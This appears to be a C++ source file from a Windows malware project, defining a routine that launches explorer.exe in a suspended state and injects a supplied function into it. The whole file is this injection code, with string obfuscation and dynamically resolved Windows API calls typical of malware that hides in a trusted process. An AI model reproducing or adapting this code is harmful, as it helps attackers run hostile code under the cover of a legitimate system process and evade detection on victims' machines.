#include "core\injects.h"

static bool RunExplorer( HANDLE* hprocess, HANDLE* hthread )
{
	StringBuilderStack<32> explorer( _CS_("explorer.exe") );
	return Process::Exec( CREATE_SUSPENDED, 0, hprocess, hthread, 0, 0, explorer ) != 0;
}

bool JmpToExplorer( typeFuncThread func )
{
	HANDLE hprocess, hthread;
	if( RunExplorer( &hprocess, &hthread ) )
	{
		if( RunInjectCode( hprocess, hthread, func, &InjectCode2 ) )
			return true;
		else
			API(KERNEL32, TerminateThread)( hthread, 0 );
	}
	return false;
}
